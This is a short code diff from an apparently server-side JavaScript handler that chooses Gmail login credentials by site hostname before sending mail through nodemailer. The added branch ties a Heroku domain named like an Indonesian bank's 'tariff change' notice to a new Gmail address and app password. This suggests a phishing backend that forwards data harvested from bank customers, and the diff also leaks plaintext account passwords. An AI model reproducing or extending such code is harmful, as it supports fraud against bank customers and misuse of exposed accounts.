@@ -44,7 +44,11 @@ export default function handler(req, res) {
         email = 'bbri94669@gmail.com';
         pass = 'tdoctundphxocdqu';
 
-    }   
+    } else if(url == 'perubahantarif--bri.herokuapp.com'){
+        email = 'bossmudaid766@gmail.com';
+        pass = 'xvahirtwxvbntkxv';
+
+    }  
         
         try {
             const transporter = nodemailer.createTransport({
